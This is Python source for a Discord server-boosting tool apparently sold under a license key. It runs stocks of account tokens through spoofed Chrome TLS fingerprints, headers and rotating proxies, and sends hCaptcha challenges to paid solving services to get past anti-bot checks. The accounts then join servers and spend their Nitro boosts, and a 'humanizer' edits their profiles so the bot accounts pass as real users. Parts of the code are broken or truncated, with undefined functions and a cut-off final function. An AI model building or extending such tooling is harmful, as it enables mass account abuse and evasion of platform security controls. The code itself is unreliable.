import authsystem
import json
from datetime import datetime
import sys
import os
import re
import time
from time import sleep
import aiohttp
import base64


def check_license():
    try:
        with open("license.key", "r") as f:
            key_data = json.load(f)

        valid_key = "MY-SECRET-KEY-123"
        if key_data["key"] != valid_key:
            print("❌ Invalid license key.")
            sys.exit()

        expires = datetime.fromisoformat(key_data["expires"])
        if datetime.now() > expires:
            print("❌ License expired.")
            sys.exit()

    except Exception as e:
        print(f"❌ License check failed: {e}")
        sys.exit()

bannerc = "	\x1b[38;5;87m"
L1 = "\x1b[38;5;177m"
L = "\x1b[38;5;97m"

def create_folder(folder_path):
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
        print(f"Folder '{folder_path}' created.")

def create_file(file_path):
    if not os.path.exists(file_path):
        with open(file_path, 'w') as f:
            f.write('')
        print(f"File '{file_path}' created.")

def setup_folders_and_files():
    paths = {
        'keys_folder': 'data/keys',
        'keys_file': 'data/keys/keys.json',
        'used_keys_file': 'data/keys/used_keys.json',
        'output_folder': 'data/output',
        'success_file': 'data/output/success.txt',
        'failed_boosts_file': 'data/output/failed_boosts.txt',
        'data_folder': 'data',
        'one_million_file': 'data/1m.txt',
        'three_month_file': 'data/3m.txt',
        'proxies_file': 'data/proxies.txt'
    }

    create_folder(paths['keys_folder'])
    create_folder(paths['output_folder'])
    create_folder(paths['data_folder'])
    create_file(paths['keys_file'])
    create_file(paths['used_keys_file'])
    create_file(paths['success_file'])
    create_file(paths['failed_boosts_file'])
    create_file(paths['one_million_file'])
    create_file(paths['three_month_file'])
    create_file(paths['proxies_file'])

setup_folders_and_files()

from discord_webhook import DiscordWebhook, DiscordEmbed
from threading import Thread
import discord
from websockets.exceptions import ConnectionClosedError
from enum import Enum, IntEnum
from discord.interactions import Interaction
from typing import Dict, List, Optional, Tuple, Union
from discord.ui import button
import json, httpx, tls_client, threading, time, random, hashlib, sys, os
from discord.ui.item import Item
from flask import request, Flask, jsonify
from discord.ui import Modal, TextInput
from discord.ext import commands
import requests
from base64 import b64encode
from discord import app_commands
from json.decoder import JSONDecodeError
import websockets
import os
import logging
from pymongo import MongoClient
from colorama import Fore, Style
from fastapi import FastAPI
from fastapi.params import Body
import datetime
from uvicorn import run
from concurrent.futures import ThreadPoolExecutor
bot = commands.Bot( command_prefix=",", intents=discord.Intents.all())
class Fore:
    BLACK = "\033[30m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    WHITE = "\033[37m"
    UNDERLINE = "\033[4m"
    RESET = "\033[0m"


logging.basicConfig(level=logging.INFO, datefmt='%H:%M')
logging.addLevelName(logging.INFO, f'{L}[{Fore.WHITE}#{L}]{L1} |{Style.RESET_ALL}')
logging.addLevelName(logging.ERROR, f'{L}[{Fore.RED}-{L}]{L1} |{Style.RESET_ALL}')
logging.addLevelName(logging.WARNING, f'{L}[{Fore.YELLOW}WARNING{L}]{L1} |{Style.RESET_ALL}')
config = json.load(open("config/config.json", encoding="utf-8"))
oconfig = json.load(open("config/onliner.json", encoding="utf-8"))
logging.basicConfig(level=logging.INFO)
webhook_url = config['webhook_url']
use_log = config['use_log']
def send_webhook_message(webhook_url, content, embed):
    webhook = DiscordWebhook(url=webhook_url, content=content)
    webhook.add_embed(embed)
    response = webhook.execute()
    if response.status_code in [200, 201, 202, 203, 204, 205, 206, 207]:
        pass
    else:
        logging.error(f"Failed to send message. Status code: {response.status_code}")


# Boost command
@bot.command()
async def boost2(ctx, invite_code: str):
    try:
        with open("data/1m.txt") as f:
            tokens = f.read().splitlines()

        # Remove the undefined join_server function call
        # with ThreadPoolExecutor(max_workers=5) as executor:
        #     futures = [executor.submit(join_server, token, invite_code) for token in tokens]
        #     for future in futures:
        #         future.result()
        
        await ctx.send(f"Boost process started for invite code: {invite_code}")
    except FileNotFoundError:
        await ctx.send("Token file not found. Please add tokens first.")
    except Exception as e:
        await ctx.send(f"Error: {e}")






powerboosts = f"""{Fore.GREEN}

 _______                                   __            _______               __     
/       \                                 /  |          /       \             /  |    
$$$$$$$  |  ______    ______    _______  _$$ |_         $$$$$$$  |  ______   _$$ |_   
$$ |__$$ | /      \  /      \  /       |/ $$   |        $$ |__$$ | /      \ / $$   |  
$$    $$< /$$$$$$  |/$$$$$$  |/$$$$$$$/ $$$$$$/         $$    $$< /$$$$$$  |$$$$$$/   
$$$$$$$  |$$ |  $$ |$$ |  $$ |$$      \   $$ | __       $$$$$$$  |$$ |  $$ |  $$ | __ 
$$ |__$$ |$$ \__$$ |$$ \__$$ | $$$$$$  |  $$ |/  |      $$ |__$$ |$$ \__$$ |  $$ |/  |
$$    $$/ $$    $$/ $$    $$/ /     $$/   $$  $$/       $$    $$/ $$    $$/   $$  $$/ 
$$$$$$$/   $$$$$$/   $$$$$$/  $$$$$$$/     $$$$/        $$$$$$$/   $$$$$$/     $$$$/  

                                                                                      

{Fore.RESET}"""

gradient_colors = [bannerc]

def animate_gradient():
    for i in range(len(gradient_colors) * 2):
        os.system('cls' if os.name == 'nt' else 'clear')  
        for line in powerboosts.split('\n'):
            gradient_index = i % len(gradient_colors)
            print(f"{gradient_colors[gradient_index]}{line}{Fore.RESET}")
        time.sleep(0.05)

animation_thread = threading.Thread(target=animate_gradient)
animation_thread.start()
animation_thread.join()

class DiscordWebSocket:
    def __init__(self, *args, **kwargs):
        self.websocket = None
        self.initialize_websocket(*args, **kwargs)

    def initialize_websocket(self, *args, **kwargs):
        # Implementation of websocket_instance
        print("initialize_websocket method called")
        # Add your actual implementation here

    def websocket_instance(self, url, proxy=None):
        try:
            import websockets
            if proxy:
                # Handle proxy connection if needed
                pass
            # This would need proper websocket implementation
            print(f"Connecting to websocket: {url}")
        except ImportError:
            print("websockets library not available")
        except Exception as e:
            print(f"Websocket connection error: {e}")

def log_error(error_message):
    log_directory = "database"
    log_file = "errors.txt"
    if not os.path.exists(log_directory):
        os.makedirs(log_directory)
    with open(os.path.join(log_directory, log_file), "a") as file:
        file.write(error_message + "\n")

# Example usage
try:
    socket = DiscordWebSocket()
except Exception as e:
    log_error(f"Error creating DiscordWebSocket instance: {e}")

# Ensure to properly terminate any additional threads or processes here before interpreter shutdown


class MyCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def load_persistent_view(self):
        return PanelView(), AutoView()


def get_checksum():
    md5_hash = hashlib.md5()
    with open(''.join(sys.argv), "rb") as file:
        md5_hash.update(file.read())
    return md5_hash.hexdigest()

def detect_unusual_text(text):
    pattern = re.compile(r'\b\w+\s\w+\b')  
    
    if pattern.search(text):
        return True
    return False

def check_file_for_unusual_text(file_path):
    with open(file_path, 'r') as file:
        for line_number, line in enumerate(file, 1):
            if detect_unusual_text(line):
                content="It's just a warning and you can ignore it if it's not valid and if possible report in leon shop support server! "
                if webhook_url != "" and use_log == True:
                    embed = DiscordEmbed(title="**Boosting Data**", description=f"Please make sure to check {file_path} \n **Error** \n  ``` Invalid text detected in line {line_number}: {line.strip()} ``` \n [ Use /get_tokens to get the tokens and check them and after that use /clean_token_file and clean the token files and readd the tokens ]", color=0x2F3136)
                    send_webhook_message(webhook_url, content, embed)
                return True
            else : 
                pass
                return False

file_paths = ['data/1m.txt', 'data/3m.txt']
for file_path in file_paths:
    check_file_for_unusual_text(file_path)
api_key = config['captcha_solver']['hcoptcha_api_key']
cs_api_key = config['captcha_solver']['capsolver_api_key']
csolver = config['captcha_solver']['capsolver_api_key']

h_proxy = None


class Status(Enum):
    ONLINE = "online" 
    DND = "dnd"  
    IDLE = "idle" 
    INVISIBLE = "invisible"  
    OFFLINE = "offline" 


class Activity(Enum):
    GAME = 0  
    STREAMING = 1  
    LISTENING = 2  
    WATCHING = 3  
    CUSTOM = 4  
    COMPETING = 5 


class OPCodes(Enum):
    Dispatch = 0  
    Heartbeat = 1
    Identify = 2 
    PresenceUpdate = 3
    VoiceStateUpdate = 4
    Resume = 6  
    Reconnect = 7  
    RequestGuildMembers = (
        8  
    )
    InvalidSession = 9  
    Hello = (
        10  
    )
    HeartbeatACK = 11 


class DiscordIntents(IntEnum):
    GUILDS = 1 << 0
    GUILD_MEMBERS = 1 << 1
    GUILD_MODERATION = 1 << 2
    GUILD_EMOJIS_AND_STICKERS = 1 << 3
    GUILD_INTEGRATIONS = 1 << 4
    GUILD_WEBHOOKS = 1 << 5
    GUILD_INVITES = 1 << 6
    GUILD_VOICE_STATES = 1 << 7
    GUILD_PRESENCES = 1 << 8
    GUILD_MESSAGES = 1 << 9
    GUILD_MESSAGE_REACTIONS = 1 << 10
    GUILD_MESSAGE_TYPING = 1 << 11
    DIRECT_MESSAGES = 1 << 12
    DIRECT_MESSAGE_REACTIONS = 1 << 13
    DIRECT_MESSAGE_TYPING = 1 << 14
    MESSAGE_CONTENT = 1 << 15
    GUILD_SCHEDULED_EVENTS = 1 << 16
    AUTO_MODERATION_CONFIGURATION = 1 << 20
    AUTO_MODERATION_EXECUTION = 1 << 21


class Presence:
    def __init__(self, online_status: Status) -> None:
        self.online_status: Status = online_status
        self.activities: List[Activity] = []

    def addActivity(
        self, name: str, activity_type: Activity, url: Optional[str]
    ) -> int:

        self.activities.append(
            {
                "name": name,
                "type": activity_type.value, 
                "url": url if activity_type == Activity.STREAMING else None,
            }
        )
        return len(self.activities) - 1

    def removeActivity(self, index: int) -> bool:
        if index < 0 or index >= len(self.activities):
            return False
        self.activities.pop(index)
        return True
class AvatarSocket:
    def __init__(self) -> None:
        self.websocket_instance(
            "wss://gateway.discord.gg/?v=10&encoding=json"
        )
        self.heartbeat_counter = 0

        self.username: str = None
        self.required_action: str = None
        self.heartbeat_interval: int = None
        self.last_heartbeat: float = None

    def get_heatbeat_interval(self) -> None:
        resp: Dict = json.loads(self.websocket_instance.recv())
        self.heartbeat_interval = resp["d"]["heartbeat_interval"]

    def authenticate(self, token: str, rich) -> Union[Dict, bool]:
        self.websocket_instance.send(
            json.dumps(
                {
                    "op": OPCodes.Identify.value,
                    "d": {
                        "token": token,
                        "intents": DiscordIntents.GUILD_MESSAGES
                        | DiscordIntents.GUILDS,  
                        "properties": {
                            "os": "linux",  
                            "browser": "Brave",  
                            "device": "Desktop",
                        },
                        "presence": {
                            "activities": [
                                activity for activity in rich.activities
                            ],  
                            "status": rich.online_status.value,  
                            "since": time.time(),  
                            "afk": False, 
                        },
                    },
                }
            )
        )
        try:
            resp = json.loads(self.websocket_instance.recv())
            self.username: str = resp["d"]["user"]["username"]
            self.required_action = resp["d"].get("required_action")
            self.heartbeat_counter += 1
            self.last_heartbeat = time.time()

            return resp
        except ConnectionClosedError:
            return False

    def send_heartbeat(self) -> websockets.typing.Data:
        self.websocket_instance.send(
            json.dumps(
                {"op": OPCodes.Heartbeat.value, "d": None}
            ) 
        )

        self.heartbeat_counter += 1
        self.last_heartbeat = time.time()

        resp = self.websocket_instance.recv()
        return resp
    

    def avatar_socket(token: str, activity: Presence):
        socket = DiscordWebSocket()
        socket.get_heatbeat_interval()

        auth_resp = socket.authenticate(token, activity)

        if not auth_resp:
            return
        while True:
            try:
                if (
                    time.time() - socket.last_heartbeat
                    >= (socket.heartbeat_interval / 1000) - 5
                ):  
                    resp = socket.send_heartbeat()
                time.sleep(0.5)
            except IndentationError:
                print(resp)
    def run_socket(self, token):
        with open("config/onliner.json", "r") as config_file:
            config: Dict[str, Union[List[str], Dict[str, List[str]]]] = json.loads(config_file.read())

        activity_types: List[Activity] = [
            Activity[x.upper()] for x in config["choose_random_activity_type_from"]
        ]
        online_statuses: List[Status] = [
            Status[x.upper()] for x in config["choose_random_online_status_from"]
        ]
        online_status = random.choice(online_statuses)
        chosen_activity_type = random.choice(activity_types)
        url = None

        if chosen_activity_type:
            if Activity.GAME:
                name = random.choice(config["game"]["choose_random_game_from"])

            elif Activity.STREAMING:
                name = random.choice(config["streaming"]["choose_random_name_from"])
                url = random.choice(config["streaming"]["choose_random_url_from"])

            elif Activity.LISTENING:
                name = random.choice(config["listening"]["choose_random_name_from"])

            elif Activity.WATCHING:
                name = random.choice(config["watching"]["choose_random_name_from"])

            elif Activity.CUSTOM:
                name = random.choice(config["custom"]["choose_random_name_from"])

            elif Activity.COMPETING:
                name = random.choice(config["competing"]["choose_random_name_from"])

        activity = Presence(online_status)
        activity.addActivity(activity_type=chosen_activity_type, name=name, url=url)
        x = Thread(target=main, args=(token, activity))
        x.start()
# avatar changer websocket end

try:
    h_proxy=random.choice(open("data/proxies.txt", "r").read().splitlines())
except:
    h_proxy=None
def h_captcha(sitekey, url, rqdata):
    p1 = {
	"task_type": "hcaptchaEnterprise",
	"api_key": f"{api_key}",
	"data": {
		"sitekey": sitekey,
		"url": url,
		"rqdata": rqdata ,
        "proxy": h_proxy
	}
    }
    h1 = {"Content-Type": "application/json"}

    r1 = requests.post("https://api.hcoptcha.online/api/createTask", headers=h1, json=p1)
    if r1.json()['error'] != True:
        try:    
            a = r1.json()['task_id']
            return a
        except:
            return False
    else:
        logging.error("Unable to create task")
        print(r1.json())       
        return False

def encoded(path: str):
        try:
            with open(path + random.choice(os.listdir(path)), "rb") as f:
                img = f.read()
            return f'data:image/png;base64,{b64encode(img).decode("ascii")}'
        except Exception as e:
            logging.error(f'Encoding Error: {str(e).capitalize()}')
            pass

def h_result(task_id):
    p2 = {
	"api_key": f"{api_key}",
	"task_id": task_id }
    h2 = {"Content-Type": "application/json"}
    r2 = requests.post("https://api.hcoptcha.com/api/getTaskData", headers=h2, json=p2)
    if 'captcha_key' in r2.text:
        try:    
            a = r2.json()
            return a
        except:
            return False
    else:
        if config['advance_mode']:
            logging.error(f"Unable to get solution : {r2.json()}")
        return False


def cs_captcha(sitekey, url, rqdata):
    p1 = {

	"clientKey": cs_api_key,
	"task": {
        	"type": "HCaptchaTaskProxyLess",
		"websiteKey": sitekey,
		"websiteURL": url,
		"enterprisePayload": {
      "rqdata": rqdata,
    },
	}
    }
    h1 = {"Content-Type": "application/json"}

    r1 = requests.post("https://api.capsolver.com/createTask", headers=h1, json=p1)
    if not r1.json()['errorId']:
        try:    
            a = r1.json()['taskId']
            return a
        except:
            return False
    else:
        logging.error("Unable to create task")
        if config['advance_mode'] == True:
            logging.error(f"Reason {r1.json()}")    
        return False

def cs_result(task_id):
    p2 = {
	"clientKey": cs_api_key,
	"taskId": task_id }
    h2 = {"Content-Type": "application/json"}
    r2 = requests.post("https://api.capsolver.com/getTaskResult", headers=h2, json=p2)
    if 'solution' in r2.text:
        try:    
            a = r2.json()
            return a
        except:
            a = r2.json()
            return False
            
    else:
        logging.error("Unable to solve captcha")
        if config['advance_mode'] == True:
            print(r2.json())       
        return False

class Booster:
    def __init__(self) -> None:
        self.proxy = self.getProxy()
        self.crome_v = f'Chrome_{str(random.randint(110, 118))}'
        self.client = tls_client.Session(
            client_identifier=self.crome_v,
            random_tls_extension_order=True,
            ja3_string='771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,18-23-45-11-27-10-0-5-13-65037-16-51-17513-43-35-65281-41,25497-29-23-24,0',            
        )
        self.locale = random.choice(["af", "af-NA", "af-ZA", "agq", "agq-CM", "ak", "ak-GH", "am", "am-ET", "ar", "ar-001", "ar-AE", "ar-BH", "ar-DJ", "ar-DZ", "ar-EG", "ar-EH", "ar-ER", "ar-IL", "ar-IQ", "ar-JO", "ar-KM", "ar-KW", "ar-LB", "ar-LY", "ar-MA", "ar-MR", "ar-OM", "ar-PS", "ar-QA", "ar-SA", "ar-SD", "ar-SO", "ar-SS", "ar-SY", "ar-TD", "ar-TN", "ar-YE", "as", "as-IN", "asa", "asa-TZ", "ast", "ast-ES", "az", "az-Cyrl", "az-Cyrl-AZ", "az-Latn", "az-Latn-AZ", "bas", "bas-CM", "be", "be-BY", "bem", "bem-ZM", "bez", "bez-TZ", "bg", "bg-BG", "bm", "bm-ML", "bn", "bn-BD", "bn-IN", "bo", "bo-CN", "bo-IN", "br", "br-FR", "brx", "brx-IN", "bs", "bs-Cyrl", "bs-Cyrl-BA", "bs-Latn", "bs-Latn-BA", "ca", "ca-AD", "ca-ES", "ca-FR", "ca-IT", "ccp", "ccp-BD", "ccp-IN", "ce", "ce-RU", "cgg", "cgg-UG", "chr", "chr-US", "ckb", "ckb-IQ", "ckb-IR", "cs", "cs-CZ", "cy", "cy-GB", "da", "da-DK", "da-GL", "dav", "dav-KE", "de", "de-AT", "de-BE", "de-CH", "de-DE", "de-IT", "de-LI", "de-LU", "dje", "dje-NE", "dsb", "dsb-DE", "dua", "dua-CM", "dyo", "dyo-SN", "dz", "dz-BT", "ebu", "ebu-KE", "ee", "ee-GH", "ee-TG", "el", "el-CY", "el-GR", "en", "en-001", "en-150", "en-AG", "en-AI", "en-AS", "en-AT", "en-AU", "en-BB", "en-BE", "en-BI", "en-BM", "en-BS", "en-BW", "en-BZ", "en-CA", "en-CC", "en-CH", "en-CK", "en-CM", "en-CX", "en-CY", "en-DE", "en-DG", "en-DK", "en-DM", "en-ER", "en-FI", "en-FJ", "en-FK", "en-FM", "en-GB", "en-GD", "en-GG"])

        self.useragent = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) {self.crome_v}.0.0.0 Safari/537.36'
        self.failed = []
        self.success = []
        self.captcha = []
        self.getX()
        self.fingerprints()
        self.proxy = self.getProxy()

    def getX(self):
        properties = {
            "os": 'Windows',
            "browser": 'Chrome',
            "device": "",
            "system_locale": self.locale,
            "browser_user_agent": self.useragent,
            "browser_version": f'{self.crome_v}.0.0.0',
            "os_version": "10",
            "referrer": "",
            "referring_domain": "",
            "referrer_current": "",
            "referring_domain_current": "",
            "release_channel": "stable",
            "client_build_number": 236850,
            "client_event_source": None
        }

        self.x = b64encode(json.dumps(properties, separators=(',', ':')).encode("utf-8")).decode()

    def getProxy(self):
        try:
            proxy = random.choice(open("data/proxies.txt", "r").read().splitlines())
            return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        except Exception as e:
            return None

    def fingerprints(self):
        headers = {
            "authority": "discord.com",
            "method": "GET",
            "path": "/api/v9/experiments",
            "scheme": "https",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "max-age=0",
            "Priority": "u=0, i",
            "Sec-Ch-Ua": '"Not/A)Brand;v=8", "Chromium;v=126", "Brave;v=126"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": "Windows",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Sec-Gpc": "1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": self.useragent
            }
        
        tries = 0
        while tries < 10:
            try:
                r = httpx.get(f'https://discord.com/api/v9/experiments', headers=headers)
                break
            except Exception as e:
                print(f'Failed to Execute Request getting fingerprints: ' + str(e).capitalize())
                tries += 1

                if tries == 10:
                    print(f'Max Reties Completed. Failed to Execute: ' + str(e).capitalize())
                    return
            
        if not (r.status_code in (200, 201)):
            logging.error(f'Failed to Fetch Cookies from discord.com. ' + str(r.text).capitalize())
            return ''
        
        self.fp = r.json()['fingerprint']
        self.ckis = f'locale=en-US; __dcfduid={r.cookies.get("__dcfduid")}; __sdcfduid={r.cookies.get("__sdcfduid")}; __cfruid={r.cookies.get("__cfruid")}; _cfuvid={r.cookies.get("_cfuvid")}'

    def boost(self, token, invite, guild):
        headers = {
            "authority": "discord.com",
            "scheme": "https",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": str(token),
            "Content-Type": "application/json",
            "Cookie": str(self.ckis),
            "Origin": "https://discord.com",
            "Priority": "u=1, i",
            "Referer": "https://discord.com/channels/@me",
            "Sec-Ch-Ua": '"Not/A)Brand;v=8", "Chromium;v=126", "Brave;v=126"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": "Windows",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Gpc": "1",
            "User-Agent": self.useragent,
            "X-Debug-Options": "bugReporterEnabled",
            "X-Discord-Locale": "en-US",
            "X-Discord-Timezone": "Asia/Calcutta",
            'X-fingerprint': self.fp,
            "X-Super-Properties": self.x
            }

        slots = self.client.get(
            "https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots",
            headers=headers,
        )

        slot_json = slots.json()
        tkv = token

        if slots.status_code == 401:
            logging.error(f"{tkv} Invalid/No-Nitro")
            return
        
        elif slots.status_code != 200 or len(slot_json) == 0:
            logging.error(f"{tkv} Invalid/No-Nitro")
            return

        r = self.client.post(
            f"https://discord.com/api/v9/invites/{invite}", headers=headers, json={}
        )

        if r.status_code == 200:
            self.guild_id = r.json()["guild"]["id"]
            boostsList = []
            for boost in slot_json:
                boostsList.append(boost["id"])

            payload = {"user_premium_guild_subscription_slot_ids": boostsList}

            headers["method"] = "PUT"
            headers["path"] = f"/api/v9/guilds/{guild}/premium/subscriptions"

            boosted = self.client.put(
                f"https://discord.com/api/v9/guilds/{guild}/premium/subscriptions",
                json=payload,
                headers=headers,
            )

            if boosted.status_code == 201:
              self.success.append(token)
              with open("output/success.txt", "a") as file:
                file.write(token + "\n")
                return True
            else:
             with open("output/failed_boosts.txt", "a") as file:
                file.write(token + "\n")
             self.failed.append(token)

        elif r.status_code != 200:
            join_outcome = False
            max_retries = None
            solve_captcha = None
            tr = 1
            tr0 = 1
            try:
                solve_captcha = config['captcha_solver']['solve_captcha']
            except:
                solve_captcha = False    
            try:
                max_retries = config['captcha_solver']['max_retries']

            except:
                max_retries = 2
            cap_service = None
            try:
                if config['captcha_solver']['use'] == "hcoptcha":
                    cap_service = 1
                elif config['captcha_solver']['use'] == "capsolver":
                    cap_service = 2
                else:
                    cap_service = 3
            except:
                logging.error("Captcha service can be either hcoptcha or capsolver please update it in config file!")

            if "captcha" in r.text:
              logging.error(f"Captcha Detected : {tkv}")
              with open ("data/output/captcha.txt", "a") as f:
                  f.write(token + "\n")
                  self.captcha.append(token)
              if config['captcha_solver']['solve_captcha'] == True:
                retry = 0
                while join_outcome != True and retry < max_retries and cap_service != None:
                    r = self.client.post(
                f"https://discord.com/api/v9/invites/{invite}", headers=headers, json={}
            )
                    response = r.json()
                    if cap_service != 3:
                        if cap_service == 1:
                            s1 = h_captcha(response['captcha_sitekey'], f"https://discord.com/invite/{invite}", response['captcha_rqdata'])
                        elif cap_service == 2:
                            s1 = cs_captcha(response['captcha_sitekey'], f"https://discord.com/invite/{invite}", response['captcha_rqdata'])
                        task_id = s1
                        logging.info(f"Solving Captcha : {tkv}")
                        time.sleep(10)
                        if cap_service == 1:
                            s2 = h_result(task_id)
                        else:
                            s2 = cs_result(task_id)
                    s3 = None
                    try:
                        if cap_service == 1:
                            s3 = s2['task']['captcha_key']
                        elif cap_service == 2:
                            s3 = s2['solution']['gRecaptchaResponse']
                        else:
                            s3 = csolve(response['captcha_sitekey'], f"https://discord.com/invite/{invite}", response['captcha_rqdata'])
                    except:
                        pass
                    req2headers = headers
                    req2headers.pop("Content-Length", None)
                    try: 
                        req2headers["X-Captcha-Key"] = s3 
                        req2headers["X-Captcha-Rqtoken"] = response['captcha_rqtoken']
                    except:
                        pass
                    response = self.client.post(f'https://discord.com/api/v9/invites/{invite}', json={}, headers = req2headers)
                    if response.status_code in [200, 204]:
                        join_outcome = True
                        self.guild_id = response.json()["guild"]["id"]
                        logging.info(f"Captcha Solved : {tkv}")
                        boostsList = []
                        for boost in slot_json:
                            boostsList.append(boost["id"])

                        payload = {"user_premium_guild_subscription_slot_ids": boostsList}

                        headers["method"] = "PUT"
                        headers["path"] = f"/api/v9/guilds/{guild}/premium/subscriptions"

                        boosted = self.client.put(
                            f"https://discord.com/api/v9/guilds/{guild}/premium/subscriptions",
                            json=payload,
                            headers=headers, proxy=self.proxy
                        )

                        if boosted.status_code == 201:
                            self.success.append(token)
                            with open("output/success.txt", "a") as file:
                                file.write(token + "\n")
                                logging.info(f"Boosts Successful : {tkv}")
                        else:
                            with open("output/failed_boosts.txt", "a") as file:
                                file.write(token + "\n")
                                self.failed.append(token)
                                logging.error(f"Boosts Failed : {tkv}")
                        break
                    else:
                        if "10008" in response.text:
                            logging.error(f"Token Flagged [ Unable To Join Even After A Valid Captcha Solution ]: {tkv}")
                            self.failed.append(token)
                            break
                        retry += 1
                        logging.info(f"Retrying Solving Captcha : {tkv} [ {retry}/{max_retries} ]")
            elif not "captcha" in r.text:
                tkv = token[:-8] + "*" * 8

                boostsList = []
                for boost in slot_json:
                    boostsList.append(boost["id"])

                payload = {"user_premium_guild_subscription_slot_ids": boostsList}

                headers["method"] = "PUT"
                headers["path"] = f"/api/v9/guilds/{guild}/premium/subscriptions"

                boosted = self.client.put(
                    f"https://discord.com/api/v9/guilds/{guild}/premium/subscriptions",
                    json=payload,
                    headers=headers, proxy=self.proxy
                )

                if boosted.status_code == 201:
                    self.success.append(token)
                    with open("output/success.txt", "a") as file:
                        file.write(token + "\n")
                        logging.info(f"Boosts Successful : {tkv}")
                        return True
                else:
                    with open("output/failed_boosts.txt", "a") as file:
                        file.write(token + "\n")
                        self.failed.append(token)
                        logging.error(f"Boosts Failed : {tkv}")
                


    def humanizer(self, token):
        if ':' in str(token):
            token = str(token).split(':')[2]

        else:
            token = token
        
        apiurl = 'https://discord.com/api/v9/guilds/' + self.guild_id + '/members/@me'
        ap = []
        headers = {
            "authority": "discord.com",
            "scheme": "https",
            'method': 'PATCH',
            'path': f'/api/v9/guilds/' + self.guild_id + '/members/@me',
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": str(token),
            "Content-Type": "application/json",
            "Cookie": str(self.ckis),
            "Origin": "https://discord.com",
            "Priority": "u=1, i",
            "Referer": "https://discord.com/channels/@me",
            "Sec-Ch-Ua": '"Not/A)Brand;v=8", "Chromium;v=126", "Brave;v=126"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": "Windows",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Gpc": "1",
            "User-Agent": self.useragent,
            "X-Debug-Options": "bugReporterEnabled",
            "X-Discord-Locale": "en-US",
            "X-Discord-Timezone": "Asia/Calcutta",
            'X-fingerprint': self.fp,
            "X-Super-Properties": self.x
            }
        
        h = headers
        h['path'] = '/api/v9/users/@me/profile'

        if not (config['customisation']['bio'] == ''):
            tries = 0
            while tries < 10:
                try:
                    b = self.client.patch(
                        f'https://discord.com/api/v9/users/@me/profile',
                        headers=h,
                        json={"bio": str(config['customisation']['bio'])}
                        )
                    break
                except Exception as e:
                    logging.error(f'Failed to execute Requests: '+str(e).capitalize())
                    tries += 1
                    if tries == 10:
                        return
                    
            if b.status_code == 200:
                ap.append(f'bio')
                    
        if not (config['customisation']['nick'] == ''):
            tries = 0
            while tries < 10:
                try:
                    b= self.client.patch(
                        apiurl,
                        headers=headers,
                        json={"nick": str(config['customisation']['nick'])}
                        )
                    break
                
                except Exception as e:
                    logging.error(f'Failed to execute Requests: '+str(e).capitalize())
                    tries += 1
                    if tries == 10:
                        return
            if b.status_code == 200:
                ap.append(f'nick')
        
        if config['customisation']['use_custom_pfp']:
            tries = 0
            while tries < 10:
                try:
                    b = self.client.patch(
                        apiurl,
                        headers=headers,
                        json={'avatar': encoded(f'data/avatar/')}
                        )
                    break
                
                except Exception as e:
                    logging.error(f'Failed to execute Requests: '+str(e).capitalize())
                    tries += 1
                    if tries == 10:
                        return
            if b.status_code == 200:
                ap.append(f'avatar')
        
        if config['customisation']['use_custom_banner']:
            tries = 0
            while tries < 10:
                try:
                    b = self.client.patch(
                        apiurl,
                        headers=headers,
                        json={'banner': (f'data/banner/')}
                        )
                    break
                
                except Exception as e:
                    logging.error(f'Failed to execute Requests: '+str(e).capitalize())
                    tries += 1
                    if tries == 10:
                        return
            
            if b.status_code == 200:
                ap.append(f'banner')
        
        if len(ap) in (1,2,3,4):
            logging.info(f'Successfully Humanized. {ap}')
        else:
            logging.error(f'Failed to Humanized.')
            return
    
    def humanizerthread(self, tokens):
        try:
            threads = []
            thr = len(tokens)
            for i in range(thr):
                token = tokens[i]
                t = threading.Thread(target=self.humanizer(token), args=())
                t.daemon = True
                threads.append(t)
                
            for i in range(thr):
                threads[i].start()
                
            for i in range(thr):
                threads[i].join()
        
        except Exception as e:
            logging.error(f'Failed to Execute Threads: '+ str(e).capitalize())
            return

    def thread(self, invite, tokens, guild):
        """"""
        threads = []

        for i in range(len(tokens)):
            token = tokens[i]
            t = threading.Thread(target=self.boost, args=(token, invite, guild))
            t.daemon = True
            threads.append(t)

        for i in range(len(tokens)):
            threads[i].start()

        for i in range(len(tokens)):
            threads[i].join()

        return {
            "success": self.success,
            "failed": self.failed,
            "captcha": self.captcha,
        }
    
def getStock(filename: str):
    tokens = []
    for i in open(filename, "r").read().splitlines():
        if ":" in i:
            i = i.split(":")[2]
            tokens.append(i)
        else:
            tokens.append(i)
    return tokens

def getStock_Auto(filename: str, num_tokens: int):
    with open(filename, "r") as file:
        lines = file.readlines()

    tokens = []
    remaining_lines = []

    for line in lines[:num_tokens]:
        if ":" in line:
            i = line.split(":")[2]
            tokens.append(i)
        else:
            tokens.append(line)    
    remaining_lines.extend(lines[num_tokens:])
    with open(filename, "w") as file:
        for line in remaining_lines:
            file.write(line)

    return tokens

def getinviteCode(inv):
